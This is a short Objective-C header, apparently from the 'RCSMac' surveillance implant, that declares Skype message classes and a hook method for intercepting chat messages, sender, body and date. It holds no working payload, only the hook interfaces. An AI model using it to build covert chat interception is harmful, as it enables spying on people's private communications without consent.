/*
 * RCSMac - Skype Agent
 * 
 * [QUICK TODO]
 * - Voice
 *
 * Created by Alfredo 'revenge' Pesoli on 11/05/2009
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */
#import "RCSMCommon.h"
#import "RCSMInputManager.h"

// Just to avoid compiler warnings
@interface MacContact

- (id)identity;

@end

// Just to avoid compiler warnings
@interface SkypeChatMessage

- (BOOL)isOutgoing;
- (id)date;
- (id)fromUser;
- (id)body;

@end

// Just to avoid compiler warnings
@interface mySkypeChat : NSObject

- (BOOL)isMessageRecentlyDisplayedHook: (uint)arg1;
//- (id)getChatMessageWithObjectID: (uint)arg1;
//- (id)name;
//- (id)topic;
//- (id)dialogContact;
//- (id)activeMemberHandles;
//- (id)posterHandles;

@end